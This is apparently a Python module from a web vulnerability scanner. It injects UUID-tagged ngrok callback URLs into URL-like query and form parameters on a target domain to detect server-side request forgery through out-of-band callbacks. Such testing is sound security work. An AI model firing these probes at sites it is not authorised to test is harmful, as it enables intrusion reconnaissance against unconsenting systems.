import os
import urllib
import uuid
import urllib.parse as urlparse
from typing import List

from Managers.RequestHandler import RequestHandler
from Models.GetRequestDTO import GetRequestDTO
from Models.FormRequestDTO import FormRequestDTO


class SsrfManager:

    def __init__(self, domain, cookies, headers):
        self._domain = domain
        ngrok_url = os.environ.get('ngrok_url')
        self._ngrok_url_safe = urllib.parse.quote(ngrok_url, safe='')
        self._url_params = ['url', 'redirect', 'file', 'page', 'source']
        self._tool_dir = f'Results/SsrfManager'
        self._get_domain_log = f'{self._tool_dir}/GET_{self._domain}_log.json'
        self._form_domain_log = f'{self._tool_dir}/FORM_{self._domain}_log.json'
        self._request_handler = RequestHandler(cookies, headers)

    def check_get_requests(self, dtos: List[GetRequestDTO]):

        if not os.path.exists(self._tool_dir):
            os.makedirs(self._tool_dir)

        if os.path.exists(self._get_domain_log):
            os.remove(self._get_domain_log)

        for dto in dtos:
            self.__check_params(dto.url)

    def check_form_requests(self, form_results: List[FormRequestDTO]):

        if os.path.exists(self._form_domain_log):
            os.remove(self._form_domain_log)

        for item in form_results:
            self.__send_ssrf_form_request(item)

    def __check_params(self, url):
        payloads_urls = set()
        parsed = urlparse.urlparse(url)
        queries = [s for s in parsed.query.split("&") if any(xs in str(s).lower() for xs in self._url_params)]

        for query in queries:
            csrf_payload = self.__get_url_ngrok_payload(url, str(query))
            payloads_urls.add(csrf_payload)

        for url in payloads_urls:
            self._request_handler.handle_request(url)

    def __get_url_ngrok_payload(self, url: str, query: str):
        param_split = query.split('=')
        main_url_split = url.split(query)
        uiid_str = str(uuid.uuid4())
        payload = main_url_split[0] + param_split[0] + f'={self._ngrok_url_safe}{uiid_str}' + main_url_split[1]
        with open(self._get_domain_log, 'a') as f:
            f.write(f'{uiid_str}:{payload}\n')
        return payload

    def __get_param_ngrok_payload(self, url: str, param: str, method_type: str):
        uiid_str = str(uuid.uuid4())
        payload = f'{self._ngrok_url_safe}{uiid_str}'
        with open(self._get_domain_log, 'a') as f:
            f.write(f'{uiid_str}:{url}:{param}:{method_type}\n')
        return payload

    def __send_ssrf_form_request(self, dto: FormRequestDTO):
        try:
            for form in dto.form_params:
                if form.method_type == "POST":
                    for param in form.params:
                        if any(s in str(param).lower() for s in self._url_params):
                            payload = form.params
                            old_param = payload[param]
                            payload[param] = self.__get_param_ngrok_payload(dto.url, param, "POST")

                            response = self._request_handler.handle_request(dto.url, post_data=payload)
                            if response is None:
                                continue

                            if response.status_code == 400:
                                payload[param] = old_param

                elif form.method_type == "GET":
                    url = form.action + '?'
                    for param in form.params:
                        if any(s in str(param).lower() for s in self._url_params):
                            payload = self.__get_param_ngrok_payload(dto.url, param, "POST")
                            prev_url = url
                            url += (param + f'={payload}&')

                            response = self._request_handler.handle_request(url)
                            if response is None:
                                continue

                            if response.status_code == 400:
                                url = prev_url
                else:
                    print("METHOD TYPE NOT FOUND: " + form.method_type)
                    return
        except Exception as inst:
            print(f"Exception - ({dto.url}) - {inst}")
